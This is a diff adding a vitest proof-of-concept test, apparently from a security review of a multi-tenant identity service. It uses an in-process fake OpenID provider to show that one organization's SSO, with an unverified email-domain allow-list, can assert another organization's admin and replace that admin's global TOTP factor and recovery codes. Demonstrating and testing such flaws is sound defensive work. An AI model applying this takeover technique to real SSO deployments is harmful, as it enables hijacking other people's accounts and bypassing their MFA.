@@ -1,0 +1,149 @@
+import { createHash } from 'node:crypto';
+import { newId, randomToken } from '@portico/kernel';
+import { exportJWK, generateKeyPair, type JWK, SignJWT } from 'jose';
+import { afterAll, beforeAll, describe, expect, it } from 'vitest';
+import { identity } from '../src';
+import type { OidcHttpClient } from '../src/ports';
+import { authenticate, type Harness, harness, org, PASSWORD, signIn } from './harness';
+
+/**
+ * In-process fake OpenID provider: discovery, JWKS, and a token endpoint that checks client authentication and
+ * PKCE before issuing an RS256 ID token. Keys are generated per test run; nothing listens on a port.
+ */
+async function fakeIdp(issuer: string, clientId: string, clientSecret: string) {
+  const { publicKey, privateKey } = await generateKeyPair('RS256');
+  const jwk: JWK = { ...(await exportJWK(publicKey)), kid: 'k1', alg: 'RS256', use: 'sig' };
+  const rogue = await generateKeyPair('RS256');
+  const codes = new Map<
+    string,
+    { nonce: string; challenge: string; claims: Record<string, unknown>; rogue: boolean }
+  >();
+  const calls: string[] = [];
+  const http: OidcHttpClient = {
+    async getJson(url) {
+      calls.push(`GET ${url}`);
+      if (url === `${issuer}/.well-known/openid-configuration`)
+        return {
+          issuer,
+          authorization_endpoint: `${issuer}/authorize`,
+          token_endpoint: `${issuer}/token`,
+          jwks_uri: `${issuer}/jwks`,
+        };
+      if (url === `${issuer}/jwks`) return { keys: [jwk] };
+      throw new Error(`unexpected ${url}`);
+    },
+    async postForm(url, form, headers = {}) {
+      calls.push(`POST ${url}`);
+      const basic = Buffer.from(`${clientId}:${clientSecret}`).toString('base64');
+      if (url !== `${issuer}/token` || headers.authorization !== `Basic ${basic}`)
+        return { status: 401, body: { error: 'invalid_client' } };
+      const entry = codes.get(form.code ?? '');
+      if (!entry) return { status: 400, body: { error: 'invalid_grant' } };
+      codes.delete(form.code ?? '');
+      const challenge = createHash('sha256')
+        .update(form.code_verifier ?? '')
+        .digest('base64url');
+      if (challenge !== entry.challenge)
+        return { status: 400, body: { error: 'invalid_grant', error_description: 'PKCE' } };
+      const idToken = await new SignJWT({ nonce: entry.nonce, ...entry.claims })
+        .setProtectedHeader({ alg: 'RS256', kid: 'k1' })
+        .setIssuer(issuer)
+        .setAudience(clientId)
+        .setSubject(String(entry.claims.email))
+        .setIssuedAt()
+        .setExpirationTime('5m')
+        .sign(entry.rogue ? rogue.privateKey : privateKey);
+      return { status: 200, body: { id_token: idToken, access_token: 'unused', token_type: 'Bearer' } };
+    },
+  };
+  /** The browser leg: the person authenticates at the IdP, which redirects back with a code. */
+  const authorize = (
+    authorizationUrl: string,
+    claims: Record<string, unknown>,
+    opts: { rogue?: boolean } = {},
+  ) => {
+    const u = new URL(authorizationUrl);
+    expect(u.searchParams.get('code_challenge_method')).toBe('S256');
+    expect(u.searchParams.get('client_id')).toBe(clientId);
+    const code = randomToken(16);
+    codes.set(code, {
+      nonce: u.searchParams.get('nonce') as string,
+      challenge: u.searchParams.get('code_challenge') as string,
+      claims,
+      rogue: opts.rogue ?? false,
+    });
+    return { code, state: u.searchParams.get('state') as string };
+  };
+  return { http, authorize, calls };
+}
+
+
+import { base32Decode, hotp, timeStep } from '../src/domain/totp';
+
+let h: Harness;
+let idp: Awaited<ReturnType<typeof fakeIdp>>;
+const issuer = 'https://idp.attacker.test';
+beforeAll(async () => {
+  idp = await fakeIdp(issuer, 'c', 'secret-secret');
+  h = await harness({ oidcHttp: undefined });
+  h.ports.oidcHttp = idp.http;
+});
+afterAll(async () => h?.t.drop());
+
+describe('REVIEW PoC: an organization\'s SSO asserts another organization\'s member and rewrites their global MFA', () => {
+  it('attacker org (enterprise plan) replaces the TOTP factor and recovery codes of a live-org admin', async () => {
+    // Victim: admin of a live org with TOTP.
+    const live = await org(h, { name: 'Victim resort' });
+    const victimEmail = `gm-${newId().slice(-6)}@victim.mv`;
+    const victim = await live.member([{ roleKey: 'org_admin', scopeType: 'organization' }], victimEmail);
+    const v = await signIn(h, victim.email);
+    const e1 = await live.tx((tx) => identity.enrolTotp(tx, h.ports), v.ctx);
+    await live.tx(
+      (tx) => identity.confirmTotp(tx, h.ports, { code: hotp(base32Decode(e1.secret), timeStep(h.clock.now())) }),
+      v.ctx,
+    );
+    // Attacker org: SSO with the VICTIM's domain on the allow-list (no domain verification) and its own IdP.
+    const attacker = await org(h, { name: 'Attacker org' });
+    await attacker.tx((tx) =>
+      identity.configureSso(tx, h.ports, {
+        displayName: 'x',
+        issuer,
+        clientId: 'c',
+        clientSecret: 'secret-secret',
+        allowedEmailDomains: ['victim.mv'],
+      }),
+    );
+    await attacker.tx((tx) =>
+      identity.setGroupRoleMappings(tx, h.ports, [{ group: 'g', roleKey: 'read_only', scopeType: 'organization' }]),
+    );
+    const start = await identity.startSsoLogin(h.t.db, h.ports, { organizationId: attacker.tenantId });
+    const { code, state } = idp.authorize(start.authorizationUrl, {
+      email: victimEmail,
+      email_verified: true,
+      groups: ['g'],
+      amr: ['mfa'],
+    });
+    const s = await identity.completeSsoLogin(h.t.db, h.ports, { state, code });
+    expect(s.userId).toBe(victim.userId); // same GLOBAL user
+    const ctx = await authenticate(h, s.token);
+    if (!ctx) throw new Error('no ctx');
+    // Replace the victim's (global) authenticator and take fresh recovery codes.
+    const e2 = await attacker.tx((tx) => identity.enrolTotp(tx, h.ports), ctx);
+    h.clock.advance(31_000);
+    const conf = await attacker.tx(
+      (tx) => identity.confirmTotp(tx, h.ports, { code: hotp(base32Decode(e2.secret), timeStep(h.clock.now())) }),
+      ctx,
+    );
+    expect(conf.recoveryCodes).toHaveLength(10);
+    // The victim's own authenticator no longer works for the LIVE organization; the attacker's does.
+    const login = await identity.login(h.t.db, { email: victimEmail, password: PASSWORD, organizationId: live.tenantId });
+    if (login.status !== 'mfa_required') throw new Error(login.status);
+    h.clock.advance(31_000);
+    await expect(
+      identity.completeMfaChallenge(h.t.db, h.ports, {
+        challengeToken: login.challengeToken,
+        code: hotp(base32Decode(e1.secret), timeStep(h.clock.now())),
+      }),
+    ).rejects.toMatchObject({ code: 'unauthenticated' });
+  });
+});
